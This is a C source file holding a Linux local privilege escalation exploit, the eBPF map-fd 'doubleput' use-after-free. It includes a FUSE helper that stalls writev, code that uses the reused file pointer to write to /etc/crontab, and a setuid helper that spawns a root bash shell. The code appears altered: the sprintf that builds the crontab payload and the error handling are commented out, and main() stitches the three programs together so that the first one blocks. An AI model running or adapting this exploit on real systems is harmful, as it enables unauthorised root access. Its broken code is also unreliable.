/*
gcc -o hello hello.c -Wall -std=gnu99 `pkg-config fuse --cflags --libs`
gcc -o doubleput doubleput.c -Wall
gcc -o suidhelper suidhelper.c -Wall
*/

/*------<hello.c>--------*/
/*
  FUSE: Filesystem in Userspace
  Copyright (C) 2001-2007  Miklos Szeredi <miklos@szeredi.hu>
  heavily modified by Jann Horn <jannh@google.com>

  This program can be distributed under the terms of the GNU GPL.
  See the file COPYING.

  gcc -Wall hello.c `pkg-config fuse --cflags --libs` -o hello
*/
#define _GNU_SOURCE
#define FUSE_USE_VERSION 26

#include <fuse.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <err.h>
#include <sys/uio.h>
#include <sched.h>

static const char *hello_path = "/hello";

static char data_state[sizeof(struct iovec)];

static int hello_getattr(const char *path, struct stat *stbuf)
{
	int res = 0;
	memset(stbuf, 0, sizeof(struct stat));
	if (strcmp(path, "/") == 0) {
		stbuf->st_mode = S_IFDIR | 0755;
		stbuf->st_nlink = 2;
	} else if (strcmp(path, hello_path) == 0) {
		stbuf->st_mode = S_IFREG | 0666;
		stbuf->st_nlink = 1;
		stbuf->st_size = sizeof(data_state);
		stbuf->st_blocks = 0;
	} else
		res = -ENOENT;
	return res;
}

static int hello_readdir(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi) {
	filler(buf, ".", NULL, 0);
	filler(buf, "..", NULL, 0);
	filler(buf, hello_path + 1, NULL, 0);
	return 0;
}

static int hello_open(const char *path, struct fuse_file_info *fi) {
	return 0;
}

static int hello_read(const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fi) {
	sleep(10);
	size_t len = sizeof(data_state);
	if (offset < len) {
		if (offset + size > len)
			size = len - offset;
		memcpy(buf, data_state + offset, size);
	} else
		size = 0;
	return size;
}

static int hello_write(const char *path, const char *buf, size_t size, off_t offset, struct fuse_file_info *fi) {
	if (offset != 0)
		return -1;
		// errx(1, "got write with nonzero offset");
	if (size != sizeof(data_state))
		return -1;
		// errx(1, "got write with size %d", (int)size);
	memcpy(data_state + offset, buf, size);
	return size;
}

static struct fuse_operations hello_oper = {
	.getattr	= hello_getattr,
	.readdir	= hello_readdir,
	.open		= hello_open,
	.read		= hello_read,
	.write		= hello_write,
};

int hello_main(int argc, char *argv[]) {
	return fuse_main(argc, argv, &hello_oper, NULL);
}
/*-------<suidhelper.c>--------*/
#include <unistd.h>
#include <err.h>
#include <stdio.h>
#include <sys/types.h>

int suidhelper_main(void) {
	if (setuid(0) || setgid(0))
		return -1;
		// err(1, "setuid/setgid");
	fputs("we have root privs now...\n", stderr);
	execl("/bin/bash", "bash", NULL);
	// err(1, "execl");
}
/*-------<doubleput.c>---------*/
#define _GNU_SOURCE
#include <stdbool.h>
#include <errno.h>
#include <err.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <linux/bpf.h>
#include <linux/kcmp.h>

#ifndef __NR_bpf
# if defined(__i386__)
#  define __NR_bpf 357
# elif defined(__x86_64__)
#  define __NR_bpf 321
# elif defined(__aarch64__)
#  define __NR_bpf 280
# else
#  error
# endif
#endif

int uaf_fd;

int task_b(void *p) {
	/* step 2: start writev with slow IOV, raising the refcount to 2 */
	char *cwd = get_current_dir_name();
	char data[2048];
	// sprintf(data, "* * * * * root /bin/chown root:root '%s'/suidhelper; /bin/chmod 06755 '%s'/suidhelper\n#", cwd, cwd);
	struct iovec iov = { .iov_base = data, .iov_len = strlen(data) };
	if (system("fusermount -u /home/user/ebpf_mapfd_doubleput/fuse_mount 2>/dev/null; mkdir -p fuse_mount && ./hello ./fuse_mount"))
		return -1;
		// errx(1, "system() failed");
	int fuse_fd = open("fuse_mount/hello", O_RDWR);
	if (fuse_fd == -1)
		return -1;
		// err(1, "unable to open FUSE fd");
	if (write(fuse_fd, &iov, sizeof(iov)) != sizeof(iov))
		return -1;
		// errx(1, "unable to write to FUSE fd");
	struct iovec *iov_ = mmap(NULL, sizeof(iov), PROT_READ, MAP_SHARED, fuse_fd, 0);
	if (iov_ == MAP_FAILED)
		return -1;
		// err(1, "unable to mmap FUSE fd");
	// fputs("starting writev\n", stderr);
	ssize_t writev_res = writev(uaf_fd, iov_, 1);
	/* ... and starting inside the previous line, also step 6: continue writev with slow IOV */
	if (writev_res == -1)
		return -1;
		// err(1, "writev failed");
	if (writev_res != strlen(data))
		return -1;
		// errx(1, "writev returned %d", (int)writev_res);
	// fputs("writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.\n", stderr);
	while (1) sleep(1); /* whatever, just don't crash */
}

void make_setuid(void) {
	/* step 1: open writable UAF fd */
	uaf_fd = open("/dev/null", O_WRONLY|O_CLOEXEC);
	if (uaf_fd == -1)
		return;
		// err(1, "unable to open UAF fd");
	/* refcount is now 1 */

	char child_stack[20000];
	int child = clone(task_b, child_stack + sizeof(child_stack), CLONE_FILES | SIGCHLD, NULL);
	if (child == -1)
		return;
		// err(1, "clone");
	sleep(3);
	/* refcount is now 2 */

	/* step 2+3: use BPF to remove two references */
	for (int i=0; i<2; i++) {
		struct bpf_insn insns[2] = {
			{
				.code = BPF_LD | BPF_IMM | BPF_DW,
				.src_reg = BPF_PSEUDO_MAP_FD,
				.imm = uaf_fd
			},
			{
			}
		};
		union bpf_attr attr = {
			.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
			.insn_cnt = 2,
			.insns = (__aligned_u64) insns,
			.license = (__aligned_u64)""
		};
		if (syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr)) != -1)
			return;
			// errx(1, "expected BPF_PROG_LOAD to fail, but it didn't");
		if (errno != EINVAL)
			return;
			// err(1, "expected BPF_PROG_LOAD to fail with -EINVAL, got different error");
	}
	/* refcount is now 0, the file is freed soon-ish */

	/* step 5: open a bunch of readonly file descriptors to the target file until we hit the same pointer */
	int status;
	int hostnamefds[1000];
	int used_fds = 0;
	bool up = true;
	while (1) {
		if (waitpid(child, &status, WNOHANG) == child)
			return;
			// errx(1, "child quit before we got a good file*");
		if (up) {
			hostnamefds[used_fds] = open("/etc/crontab", O_RDONLY);
			if (hostnamefds[used_fds] == -1)
				return;
				// err(1, "open target file");
			if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, hostnamefds[used_fds]) == 0) break;
			used_fds++;
			if (used_fds == 1000) up = false;
		} else {
			close(hostnamefds[--used_fds]);
			if (used_fds == 0) up = true;
		}
	}
	// fputs("woohoo, got pointer reuse\n", stderr);
	while (1) sleep(1); /* whatever, just don't crash */
}

int doubleput_main(void) {
	pid_t child = fork();
	if (child == -1)
		return -1;
		// err(1, "fork");
	if (child == 0)
		make_setuid();
	struct stat helperstat;
	while (1) {
		if (stat("suidhelper", &helperstat))
			return -1;
			// err(1, "stat suidhelper");
		if (helperstat.st_mode & S_ISUID)
			break;
		sleep(1);
	}
	// fputs("suid file detected, launching rootshell...\n", stderr);
	execl("./suidhelper", "suidhelper", NULL);
	// err(1, "execl suidhelper");
}

int main(int argc, char *argv[]){
	hello_main(argc, argv);
	suidhelper_main();
	doubleput_main();
}